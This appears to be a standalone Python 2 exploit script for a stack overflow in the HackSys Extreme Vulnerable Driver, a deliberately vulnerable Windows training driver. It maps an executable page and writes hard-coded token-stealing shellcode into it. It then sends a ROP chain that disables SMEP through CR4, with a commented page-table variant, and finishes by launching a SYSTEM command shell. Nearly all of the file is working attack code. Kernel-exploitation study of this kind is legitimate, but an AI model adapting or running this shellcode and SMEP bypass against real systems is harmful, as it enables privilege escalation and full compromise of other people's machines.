import struct
import sys
import os
import subprocess

from ctypes import *
from ctypes.wintypes import *

DEVICE_NAME   = u"\\\\.\\HacksysExtremeVulnerableDriver"
GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x3
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0

HANDLE = c_void_p
IO_COMPLETION_OBJECT = 1

ntdll    = windll.ntdll
kernel32 = windll.kernel32
Psapi = windll.Psapi

def stack(data):
    ioctl(0x222003, data)

def mmap(addr=0, size=0x1000):
    addr = c_ulonglong(addr)
    size = c_ulonglong(size)

    ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, 
                                              POINTER(c_ulonglong), 
                                              c_ulong, 
                                              POINTER(c_ulonglong), 
                                              c_ulonglong, 
                                              c_ulonglong]
    ret = ntdll.NtAllocateVirtualMemory(kernel32.GetCurrentProcess(), 
                                        byref(addr), 
                                        0, 
                                        byref(size), 
                                        MEM_RESERVE|MEM_COMMIT, 
                                        PAGE_EXECUTE_READWRITE)

    if ret != STATUS_SUCCESS:
        print '[!] Error (%#x) mapping page.' \
                    % ((ret + 0x100000000) & 0xffffffff)
        sys.exit()
    print '[.] Mapped %d page(s) at %#x' \
                % ((size.value + 0xfff) / 0x1000, addr.value)
    return addr.value

def getLastError():
    """Format GetLastError"""
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(0x00001000, 0,
                                kernel32.GetLastError(), 0,
                                buf, sizeof(buf), 0):
        return buf.value, 
    else:
        return "Unknown Error"

def write(data, addr):
    bytes_written = c_ulonglong()
    kernel32.WriteProcessMemory.argtypes = \
        [c_ulonglong, c_ulonglong, c_char_p, c_ulonglong, POINTER(c_ulonglong)]
    ret = kernel32.WriteProcessMemory(
                    kernel32.GetCurrentProcess(), c_ulonglong(addr), 
                    data, c_ulonglong(len(data)), byref(bytes_written))
    
    if ret == 0:
        print '[!] Error WriteProcessMemory: %s' % getLastError()
        sys.exit()
    print '[.] Wrote %d/%d bytes to %#x' \
                % (bytes_written.value, len(data), addr)
    return bytes_written.value

def ioctl(n, data_in='', data_out_size=1024):
    dwReturn      = c_ulong()
    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, None, OPEN_EXISTING, 0, None)
    if not driver_handle or driver_handle == -1:
        sys.exit()

    print "[+] IOCTL: %s" % hex(n)
    output = create_string_buffer("\x00"*data_out_size, data_out_size)
    dev_ioctl = kernel32.DeviceIoControl(driver_handle, n,
                                         addressof(create_string_buffer(data_in)), len(data_in),
                                         addressof(output), data_out_size,
                                         byref(dwReturn), None)
    return output

def find_base(drvname=None):
    cb                    = c_ulonglong(2048) # XXX should increase if lpcbNeeded indicates more
    myarray               = c_ulonglong * cb.value
    lpImageBase           = myarray()
    lpcbNeeded            = c_ulonglong()
    drivername_size       = c_ulonglong()
    drivername_size.value = 48
    Psapi.EnumDeviceDrivers(byref(lpImageBase), cb, byref(lpcbNeeded))
    for baseaddy in lpImageBase:
        try:
            drivername = c_char_p("\x00"*drivername_size.value)
            if baseaddy:
                Psapi.GetDeviceDriverBaseNameA.argtypes = [c_ulonglong, 
                                                           c_char_p,
                                                           c_ulonglong]
                Psapi.GetDeviceDriverBaseNameA(baseaddy, drivername,
                                                drivername_size.value)
                if drvname:
                    if drivername.value.lower() == drvname:
                        print "[.] Retrieving %s info..." % drvname
                        print "[+] %s base address: %s" \
                                        % (drvname, hex(baseaddy))
                        return baseaddy
                else:
                    if drivername.value.lower().find("krnl") !=-1:
                        print "[.] Retrieving Kernel info..."
                        print "[.] Kernel version: %s" % drivername.value
                        print "[+] Kernel base address: %s" % hex(baseaddy)
                        return (baseaddy, drivername.value)
        except Exception, e:
            print e.message,"e"
    return None
    

def exploit_stack():
    krnl_base = find_base()[0]
    print
    hevd_base = find_base('hevd.sys')
    print

    m = mmap()
    # use with cr4 method
    # token steal + "mov rbx, qword ptr [rsp+0x58];" for irp then ret 10h
    sc = ("\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x80\xb8\x00"
          "\x00\x00\x48\x89\xc1\x48\x8b\x80\xf0\x02\x00\x00\x48\x2d\xf0\x02"
          "\x00\x00\x48\x83\xb8\xe8\x02\x00\x00\x04\x75\xe9\x48\x8b\x90\x58"
          "\x03\x00\x00\x48\x89\x91\x58\x03\x00\x00\x48\x8b\x5c\x24\x58\xc2"
          "\x10\x00")
    # use with page table method
    # token steal + "mov rbx, qword ptr [rsp+0x48];" for irp
    #sc = ("\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x80\xb8\x00"
    #      "\x00\x00\x48\x89\xc1\x48\x8b\x80\xf0\x02\x00\x00\x48\x2d\xf0\x02"
    #      "\x00\x00\x48\x83\xb8\xe8\x02\x00\x00\x04\x75\xe9\x48\x8b\x90\x58"
    #      "\x03\x00\x00\x48\x89\x91\x58\x03\x00\x00\x48\x8b\x5c\x24\x48\xc3")

    write(sc, m)
    # disable smep through page tables
    #pte_addr = (m >> 9 | 0xffff << 48 | 0x1ed << 39) & 0xfffff6fffffffff8
    #rop_stack = struct.pack("<Q", krnl_base + 0x0000000014933f) # pop rax ; pop rcx ; ret
    #rop_stack += struct.pack("<Q", pte_addr)
    #rop_stack += struct.pack("<Q", 0x63)
    #rop_stack += struct.pack("<Q", krnl_base + 0x000000000ee186) # mov byte ptr [rax], cl ; ret
    #rop_stack += struct.pack("<Q", krnl_base + 0x000000003e9939) # wbinvd ; ret
    #rop_stack += struct.pack("<Q", m)                            # shellcode
    #rop_stack += struct.pack("<Q", hevd_base + 0x62a5)

    # disable smep through cr4 
    rop_stack = struct.pack("<Q", krnl_base + 0x00000000149340)  # pop rcx ; ret
    rop_stack += struct.pack("<Q", 0x406f8)
    rop_stack += struct.pack("<Q", krnl_base + 0x0000000007274e) # mov cr4, rcx ; ret
    rop_stack += struct.pack("<Q", m)                            # shellcode
    rop_stack += struct.pack("<Q", hevd_base + 0x62a5)

    #raw_input('bp hevd+5708')
    stack("A"*0x808 + rop_stack)
    print '\n[+] Privilege Escalated.'
    os.system("cmd.exe")

exploit_stack()
